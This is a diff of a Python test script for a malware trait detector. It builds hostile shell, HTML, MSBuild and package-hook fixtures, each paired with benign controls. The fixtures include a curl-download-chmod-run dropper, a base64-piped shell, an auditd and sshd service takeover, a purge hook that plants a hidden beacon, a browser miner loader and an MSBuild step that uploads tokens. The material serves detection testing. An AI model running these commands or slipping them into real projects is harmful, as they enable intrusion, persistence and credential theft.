@@ -1,130 +1,111 @@
 #!/usr/bin/env python3
-"""Exercise merged scope coverage, relocated operations, and password markup."""
-import argparse
+"""Check reviewed fixture bytes and behavioral validation regressions offline."""
+import hashlib
 import json
+import os
+from pathlib import Path
 import subprocess
 import tempfile
-from pathlib import Path
 
 ROOT = Path(__file__).resolve().parents[2]
-SERVICES = 'micro-behaviors/communications/http/services/'
-PROVIDERS = [
-    ('1rpc', 'ethereum-1rpc-provider', '1rpc.io/eth'),
-    ('1rpc', 'ethereum-1rpc-path-fragment', 'pc.io/eth'),
-    ('ankr', 'ethereum-ankr-provider', 'rpc.ankr.com/eth'),
-    ('aptos', 'aptos-fullnode-provider', 'fullnode.mainnet.aptoslabs.com'),
-    ('blastapi', 'ethereum-blastapi-provider', 'eth-mainnet.public.blastapi.io'),
-    ('blockpi', 'ethereum-blockpi-provider', 'ethereum.blockpi.network/public'),
-    ('bloxroute', 'ethereum-blxrbdn-provider', 'uk.rpc.blxrbdn.com'),
-    ('bnb-chain', 'bsc-bnbchain-provider', 'bnbchain.org'),
-    ('cloudflare', 'ethereum-cloudflare-provider', 'cloudflare-eth.com'),
-    ('defibit', 'bsc-defibit-provider', 'bsc-dataseed1.defibit.io'),
-    ('drpc', 'ethereum-drpc-provider', 'eth.drpc.org'),
-    ('drpc', 'ethereum-drpc-host-fragment', 'h.drpc.org'),
-    ('getblock', 'ethereum-getblock-provider', 'go.getblock.io'),
-    ('llamarpc', 'ethereum-llamarpc-provider', 'eth.llamarpc.com'),
-    ('meowrpc', 'ethereum-meowrpc-provider', 'eth.meowrpc.com'),
-    ('mev-blocker', 'ethereum-mevblocker-provider', 'rpc.mevblocker.io'),
-    ('nodereal', 'ethereum-nodereal-provider', 'eth-mainnet.nodereal.io'),
-    ('publicnode', 'bsc-publicnode-provider', 'bsc-rpc.publicnode.com'),
-    ('publicnode', 'ethereum-publicnode-provider', 'ethereum.publicnode.com'),
-    ('solana', 'solana-rpc-url', 'api.mainnet-beta.solana.com'),
-]
+CLEAVE = str(Path(os.environ.get('CLEAVE', ROOT.parent / 'cleave/target/release/cleave')).resolve())
+LIKE = 'objectives/impact/ui/manipulation/social/clickjacking::coordinate-bound-like-frame-trap'
+CONSTRUCTED = 'micro-behaviors/ui/controls/widget::constructed-like-iframe-coordinate-position'
+MARKUP = 'micro-behaviors/ui/controls/widget::markup-like-iframe-coordinate-position'
+AUDIT = 'objectives/evasion/security-bypass/disable-service::shell-replaces-auditd-command'
+SSH = 'objectives/persistence/login/ssh-authorized-keys::sshd-service-alternate-key-override'
+PURGE = 'objectives/persistence/system/package-manager::purge-hook-leaves-hidden-callback'
+UPLOAD = 'micro-behaviors/communications/http/request/credentials/unspecified-origin::msbuild-stdin-token-upload-'
 
 
 def main():
-    parser = argparse.ArgumentParser(description=__doc__)
-    parser.add_argument('--cleave', type=Path, default=ROOT / '../cleave/target/release/cleave')
-    args = parser.parse_args()
-    cases = {}
+    with tempfile.TemporaryDirectory(prefix='validation-repairs-') as temp:
+        work = Path(temp)
+        cases = []
 
-    def add(name, text, required=(), forbidden=()):
-        cases[name] = (text, set(required), set(forbidden))
+        def case(name, content, required=(), forbidden=(), maximum=None):
+            path = work / name
+            path.parent.mkdir(parents=True, exist_ok=True)
+            path.write_text(content)
+            cases.append((name, path, set(required), set(forbidden), maximum))
 
-    password = 'micro-behaviors/ui/controls/credential::password-input-field'
-    add('password.html', '<html><input type="password"></html>', [password])
-    add('commented-password.html', '<html><!-- <input type="password"> --><input type="text"></html>', forbidden=[password])
-    add('mixed-password.html', '<html><!-- <input type="password"> --><input type=password></html>', [password])
-    required = [f'{SERVICES}{provider}::{identifier}' for provider, identifier, _ in PROVIDERS]
-    required.append('micro-behaviors/fs/path/basename::config-header-filename')
-    strings = [url for _, _, url in PROVIDERS] + ['configs.h', 'curl ... | bash']
-    literals = ', '.join(json.dumps(value) for value in strings)
-    for filename, text in [
-        ('providers.js', f'const providers = [{literals}];\nconsole.log(providers);\n'),
-        ('providers.rb', f'providers = [{literals}]\nputs providers\n'),
-        ('providers.py', f'providers = [{literals}]\nprint(providers)\n'),
-        ('providers.c', '#include <stdio.h>\nconst char *providers[] = {' + literals + '};\nint main(int argc, char **argv) { puts(providers[argc % 22]); return 0; }\n'),
-    ]:
-        add(filename, text, required + ['metadata/package/documentation/source::abbreviated-curl-bash-reference'])
-    documentation = 'metadata/package/documentation/source::abbreviated-curl-bash-reference'
-    add('abbreviated.md', '# Example\n`curl ... | bash`\n', [documentation])
-    add('abbreviated.rtf', r'{\rtf1\ansi curl ... | bash}', [documentation])
-    add('computed-constructor.js', 'const instance = new (constructors[select()])();\n',
-        ['micro-behaviors/data/control-flow/dispatch/computed::computed-receiver-new-constructor'])
-    add('computed-navigator.js', 'navigator[family][method]();\n',
-        ['micro-behaviors/data/control-flow/dispatch/computed::browser-computed-navigator-member-call'])
-    add('indexed-return.js', 'function choose(results) { return results[0]; }\n',
-        ['micro-behaviors/data/control-flow/return::indexed-results-return'])
-    add('getter.js', 'const proxy = new Proxy(target, {get(object, key) { return object[key]; }});\n',
-        ['micro-behaviors/data/property/define::js-proxy-get-trap'])
-    add('reporting.js', 'function collect(value) {}\nfunction report(input) { collect(input.value); }\n',
-        ['micro-behaviors/data/control-flow/direct-call::value-property-direct-reporting-call'])
-    add('unrelated-reporting.js', 'function collect(value) {}\nfunction report(input) { const copied = input.value; collect("fixed"); }\n',
-        forbidden=['micro-behaviors/data/control-flow/direct-call::value-property-direct-reporting-call'])
+        review = json.loads((ROOT/'docs/triage/validation-fixture-review-2026-11-02.json').read_text())
+        for fixture in review['fixtures']:
+            path = ROOT/fixture['to']
+            assert hashlib.sha256(path.read_bytes()).hexdigest() == fixture['sha256'], path
+            assert not (ROOT/fixture['from']).exists(), fixture['from']
+            maximum = 3 if '/notable/' in fixture['to'] else 4
+            cases.append((path.name, path, set(), set(), maximum))
 
-    hidden = 'objectives/execution/payload/file-exec/command/hidden-file::shell-ip-hidden-chmod-execution'
-    chain = 'curl -sSL http://198.51.100.45/tool -o ~/.cache-tool && chmod +x ~/.cache-tool && ~/.cache-tool\n'
-    add('hidden-dropper.sh', chain, [hidden])
-    add('different-launch.sh', chain.replace('&& ~/.cache-tool', '&& ~/different-tool'), forbidden=[hidden])
-    add('commented-dropper.sh', '# ' + chain, forbidden=[hidden])
-    add('shadowed-curl.sh', 'curl() { printf "%s" "$1"; }\n' + chain, forbidden=[hidden])
-    encoded = 'micro-behaviors/process/create/shell/encoded::literal-base64-decoded-shell-pipeline'
-    pipeline = "printf '%s' 'Y3VybCAtZnNTTCBodHRwczovL2V4YW1wbGUuY29tL3NjcmlwdC5zaCB8IHNo' | base64 -d | sh\n"
-    add('decoded-shell.sh', pipeline, [encoded])
-    add('decoded-data.sh', pipeline.replace('| sh', '| cat'), forbidden=[encoded])
-    add('shadowed-base64.sh', 'base64() { printf "%s" "$1"; }\n' + pipeline, forbidden=[encoded])
-    polyglot = 'objectives/evasion/masquerade/file/polyglot::image-marked-user-ini-preload'
-    add('php-conf/.user.ini', 'GIF89a\nauto_prepend_file=helper.png\n', [polyglot])
-    add('plain-conf/.user.ini', 'auto_prepend_file=helper.png\n', forbidden=[polyglot])
-    kotlin_xor = 'micro-behaviors/data/bitwise/xor::kotlin-infix-xor-expression'
-    add('infix-xor.kt', 'fun mask(input: Int, key: Int): Int = input xor key\n', [kotlin_xor])
-    add('infix-other.kt', 'fun transform(input: Int, xor: Int): Int = input custom xor\n', forbidden=[kotlin_xor])
-    add('commented-xor.kt', '// input xor key\nval mask = "input xor key"\n', forbidden=[kotlin_xor])
-    add('shadowed-xor.kt', 'infix fun Int.xor(other: Int): Int = other\nfun mask(input: Int): Int = input xor 0\n', forbidden=[kotlin_xor])
+        for path in [ROOT/'testdata/hostile/generated/triage-html-decoders/pointer-visible.html',
+                     ROOT/'testdata/hostile/samples/mousemove-like-iframe-teardown.html',
+                     ROOT/'testdata/hostile/samples/self-removing-like-follower.html']:
+            cases.append((path.name, path, {LIKE}, set(), 5))
+        original = (ROOT/'testdata/hostile/samples/self-removing-like-follower.html').read_text()
+        case('pointer/renamed.html', original.replace('like', 'social').replace('/social.php', '/like.php').replace('var x =', 'var horizontal =').replace('(x -', '(horizontal -').replace('if (x < 0) x = 0;', 'if (horizontal < 0) horizontal = 0;'), [LIKE, CONSTRUCTED], maximum=5)
+        for name, content in {
+            'other-positioned-node': original.replace('like.style.top', 'tooltip.style.top').replace('like.style.left', 'tooltip.style.left'),
+            'other-top-node': original.replace('like.style.top', 'tooltip.style.top'),
+            'other-source-node': original.replace('like.src', 'other.src'),
+            'other-source': original.replace('www.facebook.com/plugins/like.php', 'www.example.test/widget'),
+            'unbound-x': original.replace('(x - 0)', '(other - 0)'),
+            'unbound-y': original.replace('(y - 0)', '(other - 0)'),
+        }.items():
+            case('pointer/'+name+'.html', content, forbidden=[LIKE, CONSTRUCTED])
+        alias = (ROOT/'testdata/hostile/samples/mousemove-like-iframe-teardown.html').read_text()
+        case('pointer/alias-renamed.html', alias.replace('vert', 'position').replace('theiframe', 'socialframe').replace('my', 'vertical').replace('mx', 'horizontal'), [LIKE, MARKUP], maximum=5)
+        case('pointer/alias-other-id.html', alias.replace('getElementById("theiframe").style', 'getElementById("tooltip").style'), forbidden=[LIKE, MARKUP])
+        case('pointer/alias-other-receiver.html', alias.replace('vert.left', 'other.left'), forbidden=[LIKE, MARKUP])
+        case('pointer/alias-other-source.html', alias.replace('www.facebook.com/widgets/like.php', 'www.example.test/widget'), forbidden=[LIKE, MARKUP])
 
-    breakout = 'objectives/execution/payload/script-eval/network/script-element::attribute-breakout-remote-script-injection'
-    add('breakout.html', '<img alt="ok"></title><script src="https://example.org/x/"></script>', [breakout])
-    add('quoted-script.html', '<img alt="</title><script src=https://example.org/x/></script>">', forbidden=[breakout])
-    coinimp = 'objectives/impact/cryptojacking/miner/browser::coinimp-evasive-loader-startup'
-    miner = ('<script src="https://coinimp.com./scripts/min.js"></script><script>'
-             'var miner = new Client.Anonymous("0123456789abcdef".repeat(4), {throttle: 0.3}); miner.start();</script>')
-    miner = miner.replace('"0123456789abcdef".repeat(4)', '"' + '0123456789abcdef' * 4 + '"')
-    add('known-miner.html', miner, [coinimp])
-    add('unknown-client.html', miner.replace('coinimp.com./scripts/min.js', 'unknown.example./scripts/min.js'), forbidden=[coinimp])
+        audit = "#!/bin/sh\nprintf '[Service]\\nExecStart=\\nExecStart=/bin/sh -c \"exec /usr/lib/example/worker\"\\n' > /etc/systemd/system/auditd.service.d/override.conf\n"
+        case('audit/takeover.sh', audit, [AUDIT], maximum=5)
+        case('audit/ordinary-service.sh', audit.replace('auditd.service', 'example.service'), forbidden=[AUDIT])
+        case('audit/real-auditd.sh', audit.replace('/usr/lib/example/worker', '/sbin/auditd'), forbidden=[AUDIT])
+        case('audit/no-override.sh', audit.replace('> /etc/systemd/system/auditd.service.d/override.conf', '> /tmp/preview.conf'), forbidden=[AUDIT])
+        case('audit/quoted.sh', "#!/bin/sh\ncat <<'DOC'\n"+audit+'DOC\n', forbidden=[AUDIT])
+        ssh = "#!/bin/sh\nprintf '[Service]\\nExecStart=\\nExecStart=/usr/sbin/sshd -D -o AuthorizedKeysFile=/var/lib/example/keys\\n' > /etc/systemd/system/sshd.service.d/override.conf\n"
+        case('ssh/override.sh', ssh, [SSH])
+        case('ssh/ordinary-service.sh', ssh.replace('sshd.service', 'example.service'), forbidden=[SSH])
+        case('ssh/no-override.sh', ssh.replace('> /etc/systemd/system/sshd.service.d/override.conf', '> /tmp/preview.conf'), forbidden=[SSH])
 
-    with tempfile.TemporaryDirectory(prefix='validation-repair-controls-') as temporary:
-        work = Path(temporary)
-        for filename, (text, _, _) in cases.items():
-            (work / filename).parent.mkdir(parents=True, exist_ok=True)
-            (work / filename).write_text(text)
-        subprocess.run(['cc', '-O0', '-o', str(work / 'providers.elf'), str(work / 'providers.c')], check=True)
-        cases['providers.elf'] = ('', set(required), set())
-        result = subprocess.run([str(args.cleave.resolve()), '--traits-dir', str(ROOT), '--format', 'json', '--all-files', str(work)],
-                                text=True, capture_output=True, check=True)
-        reports = {str(Path(report['path']).relative_to(work)): report for line in result.stdout.split('\n')
-                   if line.strip() for report in json.loads(line)['files']}
-        failures = []
-        for name, (_, expected, forbidden) in cases.items():
-            if name not in reports:
-                failures.append(f'{name}: missing report')
-                continue
-            found = {finding['id'] for finding in reports[name].get('traits', [])}
-            if missing := expected - found:
-                failures.append(f'{name}: missing {sorted(missing)}')
-            if unexpected := forbidden & found:
-                failures.append(f'{name}: unexpected {sorted(unexpected)}')
-        assert not failures, '\n'.join(failures)
-        print(f'{len(cases)} validation repair controls passed (20 RPC providers across source, Ruby, and ELF).')
+        purge = "#!/bin/sh\nif [ \"$1\" = purge ] && [ -e /tmp/enrolled ]; then\n  printf '#!/bin/sh\\nwhile true; do curl -fsSL https://example.test/pulse >/dev/null 2>&1; sleep 600; done\\n' > /var/lib/example/.callback\n  nohup /var/lib/example/.callback >/dev/null 2>&1 &\nfi\n"
+        case('purge/live/control/postrm', purge, [PURGE], maximum=5)
+        case('purge/different-launch/control/postrm', purge.replace('nohup /var/lib/example/.callback', 'nohup /var/lib/example/.other'), forbidden=[PURGE])
+        case('purge/ordinary-hook/control/postrm', purge.replace('= purge', '= configure'), forbidden=[PURGE])
+        case('purge/quoted/control/postrm', "#!/bin/sh\ncat <<'DOC'\n"+purge+'DOC\n', forbidden=[PURGE])
+
+        body = "curl -fsSL --data-binary @- https://example.test/metrics &lt;&lt;'BODY'\n$(Service_TOKENS)\nBODY"
+        for number, targets, execs in [(1, 1, 1), (2, 2, 1), (3, 1, 2), (4, 2, 2)]:
+            exec_tag = '<Exec Command="'+body+'" />'
+            target = '<Target AfterTargets="Restore">'+exec_tag*execs+'</Target>'
+            case(f'msbuild/array-{number}.targets', '<Project>'+target*targets+'</Project>', [UPLOAD+str(number)], maximum=4)
+        for name, value in {'ordinary-property': body.replace('Service_TOKENS', 'Configuration'),
+                            'no-upload': body.replace('--data-binary @-', ''),
+                            'no-stdin-body': body.replace('&lt;&lt;', '&gt;'),
+                            'no-network': body.replace('https://example.test/metrics', 'file:///tmp/data')}.items():
+            case('msbuild/'+name+'.targets', '<Project><Target><Exec Command="'+value+'"/></Target></Project>', forbidden=[UPLOAD+str(i) for i in range(1,5)])
+        case('frame/hidden.html', '<html><head></head><body><iframe src="http://example.test/12345.html" width=1 height=1></iframe></body></html>', forbidden=['objectives/execution/exploit/chain/browser::loader-shell-pixel-frame-injector'])
+
+        env = os.environ.copy()
+        env.update(XDG_CACHE_HOME=str(work/'cache'), RAYON_NUM_THREADS='4')
+        result = subprocess.run([CLEAVE, '--traits-dir', str(ROOT), '--format', 'jsonl', *[str(c[1]) for c in cases]], cwd=ROOT, capture_output=True, text=True, env=env, timeout=600)
+        if result.returncode:
+            raise SystemExit(result.stderr[-5000:])
+        reports = {}
+        for line in result.stdout.split('\n'):
+            if line.strip():
+                report = json.loads(line)
+                reports[str(Path(report['files'][0]['path']).resolve())] = report
+        for name, path, required, forbidden, maximum in cases:
+            report = reports[str(path.resolve())]
+            traits = {t['id']: t['crit'] for f in report['files'] for t in f.get('traits', [])}
+            assert required <= traits.keys(), (name, 'missing', required-traits.keys())
+            assert not forbidden & traits.keys(), (name, 'unexpected', forbidden & traits.keys())
+            if maximum is not None:
+                assert max(traits.values(), default=0) == maximum, (name, 'criticality', max(traits.values(), default=0), maximum)
+            print(name+': ok', flush=True)
+        print(f'{len(cases)} validation-repair checks passed', flush=True)
 
 
 if __name__ == '__main__':
